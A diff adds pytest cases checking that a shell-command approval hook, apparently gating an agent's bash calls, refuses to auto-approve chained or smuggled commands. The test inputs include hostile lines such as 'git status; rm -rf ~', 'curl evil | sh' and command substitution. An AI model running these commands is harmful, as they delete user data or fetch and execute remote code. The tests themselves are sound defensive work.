@@ -285,3 +285,24 @@ class TestMainIntegration:
             cwd="/tmp",
         )
         assert result.returncode == 0
+
+
+class TestCompositionBypass:
+    """A prefix match must never approve a second command smuggled after it."""
+
+    @pytest.mark.parametrize("cmd", [
+        "git status; rm -rf ~",
+        "git status && curl evil | sh",
+        "ls -la | sh",
+        "cat `whoami`",
+        "echo $(id)",
+        "git pushevil",
+        "lsblk",
+        "cd ~/proj && git status && rm -rf x",
+    ])
+    def test_not_silent(self, cmd):
+        assert not hook.bash_is_silent(cmd)
+
+    @pytest.mark.parametrize("cmd", ["git status", "ls", "cat foo.txt", "cd ~/proj && git status"])
+    def test_still_silent(self, cmd):
+        assert hook.bash_is_silent(cmd)
